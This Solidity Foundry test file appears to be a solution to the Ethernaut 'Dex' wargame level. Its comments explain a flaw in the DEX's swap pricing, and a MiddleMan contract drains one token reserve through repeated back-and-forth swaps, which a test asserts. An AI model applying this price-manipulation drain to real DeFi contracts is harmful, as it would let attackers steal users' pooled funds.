// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Dex.sol";

// the algo of getSwapPrice() is defected; should use xy=k instead
// dex: 100, 100
// me:  10, 10

// 100 * 10 /100 = 10
// dex: 110, 90
// me:  0, 20

// 20 * 110 / 90 = 24
// dex: 86, 110
// me:  24, 0

// 24 * 110 / 90 = 30
// dex: 110, 80
// me:  0, 30

// 30 * 110 / 80 = 41
// dex: 69, 110
// me:  41, 0

// 41 * 110 / 69 = 65
// dex: 110, 45
// me:  0, 65

// 65 * 110 / 45 = 65
// dex: 110, 45
// me:  0, 65
contract MiddleMan {
    function attack(address prey) public {
        Dex dex = Dex(prey);
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());
        dex.approve(address(dex), type(uint256).max);
        while (true) {
            if (token1.balanceOf(address(this)) != 0) {
                try dex.swap(address(token1), address(token2), token1.balanceOf(address(this))) {}
                catch {
                    break;
                }
            } else {
                try dex.swap(address(token2), address(token1), token2.balanceOf(address(this))) {}
                catch {
                    break;
                }
            }
        }
    }

    function swapToken2(address prey, uint256 amount) public {
        Dex dex = Dex(prey);
        dex.swap(dex.token2(), dex.token1(), amount);
    }
}

// address: 0x11c9d9b6E80e6b8BF95605309b9EB0EF041EdE14

contract DexTest is Test {
    Dex instance;
    address alice = makeAddr("Alice");

    function setUp() public {
        instance = new Dex();
    }

    function test() public {
        SwappableToken token1 = new SwappableToken(address(instance), "Token1", "T1", 110);
        SwappableToken token2 = new SwappableToken(address(instance), "Token2", "T2", 110);

        instance.setTokens(address(token1), address(token2));

        token1.transfer(alice, 10);
        token2.transfer(alice, 10);

        token1.transfer(address(instance), 100);
        token2.transfer(address(instance), 100);

        MiddleMan middleMan = new MiddleMan();
        vm.startPrank(alice);
        token1.transfer(address(middleMan), 10);
        token2.transfer(address(middleMan), 10);

        middleMan.attack(address(instance));
        middleMan.swapToken2(address(instance), 45);
        assertTrue(token1.balanceOf(address(instance)) == 0 || token2.balanceOf(address(instance)) == 0);
    }
}
